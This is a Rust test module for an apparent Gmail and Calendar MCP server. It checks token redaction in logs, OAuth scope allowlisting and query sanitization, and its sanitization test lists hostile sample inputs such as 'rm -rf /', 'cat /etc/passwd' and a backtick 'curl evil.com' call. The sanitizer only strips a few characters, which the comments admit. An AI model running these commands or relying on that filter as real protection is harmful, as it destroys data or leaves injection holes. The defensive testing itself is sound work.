/// Security Tests Module
///
/// This module contains tests for security aspects of the application,
/// focusing on token handling, sensitive data logging, and authorization.
use mcp_gmailcal::config::Config;
use mcp_gmailcal::errors::{GmailApiError, GmailResult};
use serde_json::json;
use std::sync::Arc;

fn create_sensitive_config() -> Config {
    Config {
        client_id: "super_secret_client_id_12345".to_string(),
        client_secret: "super_secret_client_secret_abcde".to_string(),
        refresh_token: "super_secret_refresh_token_98765".to_string(),
        access_token: Some("super_secret_access_token_xyzabc".to_string()),
    }
}

// Mock logger to check for sensitive data
struct MockLogger {
    logs: Arc<std::sync::Mutex<Vec<String>>>,
}

impl MockLogger {
    fn new() -> Self {
        MockLogger {
            logs: Arc::new(std::sync::Mutex::new(Vec::new())),
        }
    }

    fn log(&self, message: &str) {
        let mut logs = self.logs.lock().unwrap();
        logs.push(message.to_string());
    }

    #[allow(dead_code)]
    fn contains_sensitive_data(&self, sensitive_data: &[&str]) -> bool {
        let logs = self.logs.lock().unwrap();
        for log in logs.iter() {
            for data in sensitive_data {
                if log.contains(data) {
                    return true;
                }
            }
        }
        false
    }

    fn get_logs(&self) -> Vec<String> {
        let logs = self.logs.lock().unwrap();
        logs.clone()
    }
}

// Function that simulates token handling with logger
fn handle_token(config: &Config, logger: &MockLogger) -> String {
    // DO NOT log the full client_id - this would be a security issue
    // logger.log(&format!("Getting token for client_id: {}", config.client_id));

    // Instead, truncate sensitive data in logs
    let truncated_client_id = if config.client_id.len() > 8 {
        format!("{}...", &config.client_id[0..4])
    } else {
        "(id too short)".to_string()
    };

    let truncated_refresh_token = if config.refresh_token.len() > 8 {
        format!("{}...", &config.refresh_token[0..4])
    } else {
        "(token too short)".to_string()
    };

    // Log only the truncated versions
    logger.log(&format!("Using client_id: {}", truncated_client_id));
    logger.log(&format!("Using refresh_token: {}", truncated_refresh_token));

    // Simulate token handling
    if let Some(token) = &config.access_token {
        logger.log("Using existing access token");

        // Do not log the full token, even in debug mode!
        // Instead, log a truncated version if needed:
        let truncated_token = if token.len() > 8 {
            format!("{}...{}", &token[0..4], &token[token.len() - 4..])
        } else {
            "****".to_string()
        };
        logger.log(&format!("Token starts with: {}", truncated_token));

        // Return the token
        token.clone()
    } else {
        logger.log("No access token found");
        "".to_string()
    }
}

// Simulated OAuth token request function
fn make_token_request(_client_id: &str, _client_secret: &str, scope: &str) -> GmailResult<String> {
    // Validate scope
    if !is_valid_scope(scope) {
        return Err(GmailApiError::AuthError(
            "Invalid or unauthorized scope".to_string(),
        ));
    }

    // Simulate token generation
    Ok("new_access_token".to_string())
}

// Scope validation
fn is_valid_scope(scope: &str) -> bool {
    let allowed_scopes = [
        "https://www.googleapis.com/auth/gmail.readonly",
        "https://www.googleapis.com/auth/gmail.modify",
        "https://www.googleapis.com/auth/calendar",
        "https://www.googleapis.com/auth/calendar.readonly",
        "https://www.googleapis.com/auth/contacts.readonly",
    ];

    allowed_scopes.contains(&scope)
}

// Sanitize user-provided input
fn sanitize_query(query: &str) -> String {
    // Remove any potentially harmful characters
    // This is a simplified example - real implementations would be more thorough
    let sanitized = query
        .replace(';', "")
        .replace('&', "")
        .replace('|', "")
        .replace('$', "")
        .replace('`', "")
        .replace('>', "")
        .replace('<', "");

    sanitized
}

#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_token_handling_security() {
        let config = create_sensitive_config();
        let logger = MockLogger::new();

        // Process token
        let _ = handle_token(&config, &logger);

        // Get the logs to inspect
        let logs = logger.get_logs();

        // Verify logs don't contain full sensitive data
        let sensitive_data = [
            "super_secret_client_id_12345",
            "super_secret_client_secret_abcde",
            "super_secret_refresh_token_98765",
            "super_secret_access_token_xyzabc",
        ];

        // Check that none of the full sensitive values appear in the logs
        for data in &sensitive_data {
            for log in &logs {
                assert!(
                    !log.contains(data),
                    "Log should not contain the full sensitive data: {}",
                    data
                );
            }
        }

        // Verify logs contain truncated versions - modified to not be brittle
        let has_truncated_values = logs.iter().any(
            |log| log.contains("..."), // Some truncated value with ellipsis
        );

        assert!(
            has_truncated_values,
            "Logs should contain some truncated values"
        );
    }

    #[test]
    fn test_sensitive_data_logging() {
        let logger = MockLogger::new();

        // Simulate logging with sensitive data
        let access_token = "sensitive_access_token_123";
        let user_email = "user@example.com";

        // Bad practice - logging full token
        logger.log(&format!("Access token: {}", access_token));

        // Good practice - logging email is usually ok
        logger.log(&format!("User email: {}", user_email));

        // Good practice - obscuring token
        let obscured_token = if access_token.len() > 8 {
            format!(
                "{}...{}",
                &access_token[0..4],
                &access_token[access_token.len() - 4..]
            )
        } else {
            "****".to_string()
        };
        logger.log(&format!("Token (obscured): {}", obscured_token));

        // Get all logs
        let logs = logger.get_logs();

        // Verify logs contain the full token (demonstrating bad practice)
        let has_full_token = logs.iter().any(|log| log.contains(access_token));
        assert!(
            has_full_token,
            "Logs should contain the full token in this test"
        );

        // Verify logs contain email (acceptable)
        let has_email = logs.iter().any(|log| log.contains(user_email));
        assert!(has_email, "Logs should contain the email");

        // Verify logs contain obscured token pattern
        let has_obscured_pattern = logs.iter().any(|log| log.contains("..."));
        assert!(
            has_obscured_pattern,
            "Logs should contain some obscured pattern with ..."
        );
    }

    #[test]
    fn test_input_sanitization() {
        // Test sanitization of malicious input
        let malicious_inputs = [
            "subject:important; rm -rf /",
            "from:user@example.com & echo sensitive_data",
            "is:unread | cat /etc/passwd",
            "after:2025-01-01 `curl evil.com`",
            "before:2025-01-01 > /etc/passwd",
            "has:attachment < /etc/passwd",
        ];

        for input in malicious_inputs {
            let sanitized = sanitize_query(input);

            // Verify sanitized output doesn't contain dangerous characters
            assert!(!sanitized.contains(';'));
            assert!(!sanitized.contains('&'));
            assert!(!sanitized.contains('|'));
            assert!(!sanitized.contains('$'));
            assert!(!sanitized.contains('`'));
            assert!(!sanitized.contains('>'));
            assert!(!sanitized.contains('<'));
        }
    }

    #[test]
    fn test_scope_validation() {
        // Test allowed scopes
        let valid_scopes = [
            "https://www.googleapis.com/auth/gmail.readonly",
            "https://www.googleapis.com/auth/calendar",
            "https://www.googleapis.com/auth/contacts.readonly",
        ];

        for scope in valid_scopes {
            assert!(is_valid_scope(scope), "Scope should be valid: {}", scope);
        }

        // Test disallowed scopes
        let invalid_scopes = [
            "https://www.googleapis.com/auth/gmail.settings.basic", // Not in allowed list
            "https://www.googleapis.com/auth/drive",                // Not in allowed list
            "https://www.googleapis.com/auth/cloud-platform",       // Not in allowed list
            "malicious-scope",                                      // Malformed
            "",                                                     // Empty
        ];

        for scope in invalid_scopes {
            assert!(!is_valid_scope(scope), "Scope should be invalid: {}", scope);
        }
    }

    #[test]
    fn test_token_request_with_scope() {
        // Test with valid scope
        let result = make_token_request(
            "test_client_id",
            "test_client_secret",
            "https://www.googleapis.com/auth/gmail.readonly",
        );
        assert!(result.is_ok());

        // Test with invalid scope
        let result = make_token_request(
            "test_client_id",
            "test_client_secret",
            "https://www.googleapis.com/auth/drive", // Not allowed
        );
        assert!(result.is_err());

        // Verify error type
        match result {
            Err(GmailApiError::AuthError(msg)) => {
                assert!(msg.contains("Invalid or unauthorized scope"));
            }
            _ => panic!("Expected AuthError for invalid scope"),
        }
    }

    #[test]
    fn test_secure_configuration_handling() {
        // Test secure config handling
        let config = create_sensitive_config();

        // Convert to JSON (simulating serialization for storage/transmission)
        let config_json = json!({
            "client_id": config.client_id,
            "client_secret": config.client_secret,
            "refresh_token": config.refresh_token,
            "access_token": config.access_token,
        });

        // In a secure system, we should never serialize the full credentials
        // Instead, we'd want to see something like:
        let secure_config_json = json!({
            "client_id_digest": "hash_of_client_id", // Not the actual ID
            "has_refresh_token": true, // Just indicates presence
            "token_expiry": "2025-05-01T00:00:00Z", // Expiry, not the token itself
        });

        // Verify the insecure JSON contains sensitive data
        let json_str = config_json.to_string();
        assert!(json_str.contains(&config.client_id));
        assert!(json_str.contains(&config.client_secret));
        assert!(json_str.contains(&config.refresh_token));

        // Verify the secure JSON doesn't contain sensitive data
        let secure_json_str = secure_config_json.to_string();
        assert!(!secure_json_str.contains(&config.client_id));
        assert!(!secure_json_str.contains(&config.client_secret));
        assert!(!secure_json_str.contains(&config.refresh_token));
    }
}
